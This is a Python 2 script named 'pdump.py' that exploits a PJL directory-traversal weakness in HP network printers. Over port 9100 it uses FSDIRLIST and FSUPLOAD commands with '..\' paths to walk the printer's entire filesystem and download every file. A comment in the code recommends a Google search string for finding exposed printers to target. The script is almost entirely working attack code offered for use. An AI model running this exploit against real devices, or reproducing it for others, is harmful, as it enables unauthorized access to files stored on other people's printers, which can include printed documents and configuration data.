#!/usr/bin/python2

#############################################
#   Printer Filesystem Dumper (pdump.py)    #
#  Copyright (c) 2013, Angel Garcia (Ell0)  #
#        angel@sec-root.com                 #
#############################################

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


import socket, os

IP = ""  # Set the printer IP. Google search "inurl:hp/device/this.LCDispatcher?nav=hp.Print" is your friend
PORT = 9100 
#ROOT = ["0:\\..\\..\\..\\..\\", "1:\\..\\..\\..\\..\\"]
ROOT = ["0:\\..\\..\\..\\..\\"]


def get_entry(entry_string):
	entry = ""
	if ("TYPE=DIR" in entry_string):
		entry = ["D", entry_string[:entry_string.find(" ")], "0"]
	elif ("TYPE=FILE" in entry_string):
		entry = ["F", entry_string[:entry_string.find(" ")], entry_string[entry_string.find("SIZE=") + 5:]]
	return entry


def dir_content(content):
	content_list = []
	start = content.find("\\r\\n")
	start += 4
	end = content.find("\\r\\n", start)
	
	while (end != -1):
		entry_string = content[start:end]
		if (not entry_string.startswith(". ")) and (not entry_string.startswith(".. ")):
				content_list.append(get_entry(entry_string))
		start = end + 4
		end = content.find("\\r\\n", start)

	return content_list

def get_file(filename, size, norm_filename):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IP, PORT))
	s.sendall('@PJL FSUPLOAD NAME = \"' + filename + '\" OFFSET=0 SIZE=' + str(size) + '\n')
	# I have to do two "recv" because the printer firstly responses with the command and, after a short delay, with the file itself. The first 
	# recv ends with the delay, so it's necessary to start a new recv
	data = s.recv(999999999)
	data = s.recv(999999999)
	s.close()
	f = open(norm_filename, "w")
	f.write(repr(data))
	f.close()

def dump_dir(root, log):
	log.write("Listing dir " + root + "\n")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IP, PORT))
	s.sendall('@PJL FSDIRLIST NAME = \"' + root + '\" ENTRY=1 COUNT=99999999\n')
	data = s.recv(4096)
	s.close()
	content = repr(data)
	normalized_root = root.replace("..\\", "")
	normalized_root = normalized_root.replace(":", "")
	normalized_root = normalized_root.replace("\\", "/")
	if "FILEERROR" in content:
		log.write("--> Error getting " + normalized_root + "\n")
	else:
		os.mkdir(normalized_root)
		dir_content(content)
		for entry in dir_content(content):
			if entry[0] == "D":
				dump_dir(root + entry[1] + "\\", log)
			elif entry[0] == "F":
				get_file(root + entry[1], int(entry[2]), normalized_root + entry[1])


def main():
	log = open("pdump.log", "w", 0)
	for r in ROOT:
		dump_dir(r, log)
	log.close()

if __name__ == "__main__":
	main()
